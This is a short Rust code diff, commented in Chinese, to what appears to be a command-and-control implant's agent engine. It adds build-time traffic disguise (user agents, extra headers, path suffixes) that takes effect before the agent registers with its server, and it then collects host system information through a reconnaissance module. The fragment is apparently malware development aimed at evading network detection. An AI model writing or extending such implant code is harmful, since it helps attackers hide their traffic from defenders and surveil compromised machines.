@@ -80,6 +80,14 @@ impl AgentEngine {
             &self.config.result_path,
         );
 
+        // 构建时注入的流量伪装（UA/附加头/路径后缀）在注册前生效
+        // （注册请求本身也带伪装）；注册后服务端 profile 覆盖。
+        http.set_build_style(
+            self.config.user_agents.clone(),
+            self.config.extra_headers.clone(),
+            self.config.path_suffixes.clone(),
+        );
+
         let sys_json = libra_modules::recon::SystemInfo::collect();
         let sys: Value = serde_json::from_str(&sys_json).unwrap_or(Value::Null);
         let hostname = sys["hostname"].as_str().unwrap_or("unknown");
